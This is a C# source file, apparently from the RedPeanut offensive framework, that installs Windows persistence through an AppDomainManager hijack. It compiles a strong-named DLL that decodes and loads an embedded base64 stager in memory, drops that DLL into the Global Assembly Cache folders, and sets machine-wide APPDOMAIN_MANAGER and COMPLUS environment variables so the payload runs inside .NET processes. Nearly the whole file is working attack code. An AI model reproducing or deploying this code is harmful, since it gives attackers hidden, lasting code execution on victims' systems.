using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Text;

class PersCLRInstall
{
    static string keyfile = @"#KEYFILE#";
    static string source = @"
using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Threading;

namespace Context
{
    public sealed class CLRCustom : AppDomainManager
    {
        static private string stbase64 = ""#STAGER#"";
        static private string processname = ""#PROCESS#"";
        
        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
        {
            if(appDomainInfo.ApplicationName.ToLower().Equals(processname) || processname.ToLower().Equals(""all""))
            {
                Thread commandthread = new Thread(new ThreadStart(Executer.Run));
                commandthread.Start();
            }
            return;
        }

        private static byte[] DecompressDLL(byte[] gzip)
        {
            using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
            {
                const int size = 4096;
                byte[] buffer = new byte[size];
                using (MemoryStream memory = new MemoryStream())
                {
                    int count = 0;
                    do
                    {
                        count = stream.Read(buffer, 0, size);
                        if (count > 0)
                        {
                            memory.Write(buffer, 0, count);
                        }
                    }
                    while (count > 0);
                    return memory.ToArray();
                }
            }
        }

        class Executer
        {
            public static void Run()
            {
                byte[] payload = DecompressDLL(Convert.FromBase64String(stbase64));
                Assembly assembly = Assembly.Load(payload);
                Type assemblyType = assembly.GetType(""RedPeanutRP"");
                object assemblyObject = Activator.CreateInstance(assemblyType);
            }
        }
    }
}
";
    static string filename = "#FILENAME#";
    static int clrversion = Int32.Parse("#CLRVERSION#");

    public static void Execute(string[] args)
    {
        switch (args[0])
        {

            case "install":
                if (clrversion == 40)
                {
                    AssemblyInfo info40 = InstallCLRPers(filename, keyfile, CLRVersion.Net40);

                    if (info40 != null)
                        SetupEnv(info40);
                }
                else
                {
                    AssemblyInfo info35 = InstallCLRPers(filename, keyfile, CLRVersion.Net35);
                    if (info35 != null)
                        SetupEnv(info35);
                }
                break;
            case "cleanenv":
                CleanEnv();
                break;
            default:
                Console.WriteLine("Error parameter");
                break;
        }

    }

    private static byte[] GetUnCompressedDecoded(string stream)
    {
        return DecompressDLL(Convert.FromBase64String(stream));
    }

    private static byte[] DecompressDLL(byte[] gzip)
    {
        using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
        {
            const int size = 4096;
            byte[] buffer = new byte[size];
            using (MemoryStream memory = new MemoryStream())
            {
                int count = 0;
                do
                {
                    count = stream.Read(buffer, 0, size);
                    if (count > 0)
                    {
                        memory.Write(buffer, 0, count);
                    }
                }
                while (count > 0);
                return memory.ToArray();
            }
        }
    }

    public class AssemblyInfo
    {
        public string assembyName { get; set; }
        public string version { get; set; }
        public string culture { get; set; }
        public string publickey { get; set; }
        public string runtimeVersion { get; set; }
        public Type exportedType { get; set; }
    }

    public enum CLRVersion
    {
        Net40,
        Net35
    }

    private static AssemblyInfo GetAssemblyInfo(byte[] file)
    {
        AssemblyInfo info = new AssemblyInfo();
        Assembly assembly = Assembly.Load(file);
        string[] information = assembly.FullName.Split(new string[] { ", " }, StringSplitOptions.None);
        info.runtimeVersion = assembly.ImageRuntimeVersion;
        info.exportedType = assembly.GetExportedTypes()[0];

        //Get the basic inforamtion used to install the assembly into the GAC
        info.assembyName = information[0];
        info.version = information[1].Split('=')[1];
        info.culture = information[2].Split('=')[1];
        info.publickey = information[3].Split('=')[1];

        return info;

    }

    private static string GetFirstPath(AssemblyInfo info, CLRVersion clrversion, bool create = true)
    {
        string firstPath;
        if (clrversion == CLRVersion.Net35)
            firstPath = Environment.GetEnvironmentVariable("windir") + @"\assembly\GAC_MSIL\";
        else
            firstPath = Environment.GetEnvironmentVariable("windir") + @"\Microsoft.NET\assembly\GAC_MSIL\";

        try
        {
            if (!Directory.Exists(Path.Combine(firstPath, info.assembyName)) && create)
                Directory.CreateDirectory(Path.Combine(firstPath, info.assembyName));

            firstPath += info.assembyName + "\\";
            if (clrversion == CLRVersion.Net35)
                Console.WriteLine("[*] .Net Framework < 4.0 path: " + firstPath);
            else
                Console.WriteLine("[*] .Net Framework >= 4.0 path: " + firstPath);

            //Forge the name of the second folder
            string folderName = info.runtimeVersion.Substring(0, 4) + "_" + info.version + "_";
            if (info.culture.Equals("neutral"))
            {
                folderName += "_";
            }
            else
            {
                folderName += info.culture;
            }
            folderName += info.publickey;

            //Create the second folder
            if (!Directory.Exists(Path.Combine(firstPath, folderName)) && create)
                Directory.CreateDirectory(Path.Combine(firstPath, folderName));
            //Append the name of the folder
            firstPath += folderName + "\\";
            return firstPath;
        }
        catch (Exception)
        {
            Console.WriteLine("[x] Error getting path");
            return string.Empty;
        }
    }

    private static void SetEnvVariables(string asm_name, string asm_type, string com_version)
    {
        EnvironmentVariableTarget target = EnvironmentVariableTarget.Machine;
        Environment.SetEnvironmentVariable("APPDOMAIN_MANAGER_TYPE", asm_type, target);
        Environment.SetEnvironmentVariable("APPDOMAIN_MANAGER_ASM", asm_name, target);
        Environment.SetEnvironmentVariable("COMPLUS_Version", com_version, target);
    }

    private static void UnSetEnvVariables()
    {
        EnvironmentVariableTarget target = EnvironmentVariableTarget.Machine;
        Environment.SetEnvironmentVariable("APPDOMAIN_MANAGER_TYPE", "", target);
        Environment.SetEnvironmentVariable("APPDOMAIN_MANAGER_ASM", "", target);
        Environment.SetEnvironmentVariable("COMPLUS_Version", "", target);
    }

    private static bool FileCopy(string filename, byte[] filesorce, string destfolder)
    {
        if (!Directory.Exists(destfolder))
            return false;

        if (filesorce.Length <= 0)
            return false;

        string destfile = Path.Combine(destfolder, filename);
        try
        {
            File.WriteAllBytes(destfile, filesorce);
            return true;
        }
        catch (Exception e)
        {
            Console.WriteLine("[x] File copy error: " + e.Message);
            return false;
        }

    }

    private static void DropKeyFile(string directory, byte[] keyfile)
    {
        Console.WriteLine("[*] Drop key on disk");
        File.WriteAllBytes(Path.Combine(directory, "key.snk"), keyfile);
    }

    private static AssemblyInfo InstallCLRPers(string filename, string keyfileBase64, CLRVersion ver)
    {
        //Create dll
        AssemblyInfo info = null;
        try
        {
            string[] refs = new string[] { "mscorlib.dll", "System.dll" };
            string outputfile = BuildDll(source, refs, filename, keyfileBase64, ver);
            if (!string.IsNullOrEmpty(outputfile))
            {
                byte[] outputbyte = File.ReadAllBytes(outputfile);
                info = GetAssemblyInfo(outputbyte);

                if (string.IsNullOrEmpty(info.publickey))
                {
                    Console.WriteLine("[-] The assembly is not strong-name");
                    return null;
                }

                if (ver == CLRVersion.Net35)
                {
                    string firstPath = GetFirstPath(info, CLRVersion.Net35);
                    Console.WriteLine("[*] .Net Framework < 4.0 folder: " + firstPath);
                    Console.WriteLine("[*]");
                    //Move the DLL into the created folder
                    if (!FileCopy(filename, outputbyte, firstPath))
                        return null;
                }
                else
                {
                    string secondPath = GetFirstPath(info, CLRVersion.Net40);
                    Console.WriteLine("[*] .Net Framework >= 4.0 folder: " + secondPath);
                    Console.WriteLine("[*]");
                    //Move the DLL into the created folder
                    if (!FileCopy(filename, outputbyte, secondPath))
                        return null;
                }
            }
        }
        catch (Exception e)
        {
            Console.WriteLine("[x] Error: " + e.Message);
        }
        return info;
    }

    private static void SetupEnv(AssemblyInfo info)
    {
        string asm = info.assembyName + ", Version=" + info.version + ", Culture=" + info.culture + ", PublicKeyToken=" + info.publickey;
        Console.WriteLine("[*] COMPLUS_Version=" + info.runtimeVersion);
        Console.WriteLine("[*] APPDOMAIN_MANAGER_ASM=" + asm);
        Console.WriteLine("[*] APPDOMAIN_MANAGER_TYPE=" + info.exportedType.FullName);

        Console.WriteLine("[*] Setting environment variables");
        SetEnvVariables(asm, info.exportedType.FullName, info.runtimeVersion);
        Console.WriteLine("[*] Persistence installed");
    }

    private static void CleanEnv()
    {
        Console.WriteLine("[*] COMPLUS_Version=" + Environment.GetEnvironmentVariable("COMPLUS_Version", EnvironmentVariableTarget.Machine));
        Console.WriteLine("[*] APPDOMAIN_MANAGER_ASM=" + Environment.GetEnvironmentVariable("APPDOMAIN_MANAGER_ASM", EnvironmentVariableTarget.Machine));
        Console.WriteLine("[*] APPDOMAIN_MANAGER_TYPE=" + Environment.GetEnvironmentVariable("APPDOMAIN_MANAGER_TYPE", EnvironmentVariableTarget.Machine));

        Console.WriteLine("[*] Unsetting environment variables");
        UnSetEnvVariables();
        Console.WriteLine("[*] Persistence uninstalled");
    }


    private static string BuildDll(string source, string[] refs, string filename, string keyfileBase64, CLRVersion ver)
    {
        //https://github.com/mdsecactivebreach/SharpShooter/blob/master/CSharpShooter/SharpShooter.cs
        string tmp = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp");
        DropKeyFile(tmp, DecompressDLL(Convert.FromBase64String(keyfileBase64)));
        string outname = string.Empty;
        try
        {
            Dictionary<string, string> compilerInfo = new Dictionary<string, string>();
            if(ver == CLRVersion.Net40)
                compilerInfo.Add("CompilerVersion", "v4.0");
            else
                compilerInfo.Add("CompilerVersion", "v3.5");

            CSharpCodeProvider provider = new CSharpCodeProvider(compilerInfo);
            CompilerParameters cp = new CompilerParameters();

            foreach (string r in refs)
                cp.ReferencedAssemblies.Add(r);

            cp.GenerateExecutable = false;
            cp.GenerateInMemory = false;
            cp.OutputAssembly = Path.Combine(tmp, filename);
            cp.CompilerOptions = "/keyfile:" + Path.Combine(tmp, "key.snk");

            cp.TempFiles = new TempFileCollection(tmp, false);

            CompilerResults results = provider.CompileAssemblyFromSource(cp, source);
            if (results.Errors.HasErrors)
            {
                StringBuilder sb = new StringBuilder();

                foreach (CompilerError error in results.Errors)
                {
                    sb.AppendLine(String.Format("Error ({0}): {1}", error.ErrorNumber, error.ErrorText));
                }

                throw new InvalidOperationException(sb.ToString());
            }
            outname = Path.Combine(tmp, filename);
        }
        catch (Exception e)
        {
            Console.WriteLine("[x] Error building assembly: " + e.Message);
            outname = "";
        }

        File.Delete(Path.Combine(tmp, "key.snk"));
        Console.WriteLine("[*] Cleanup");

        return outname;
    }
}
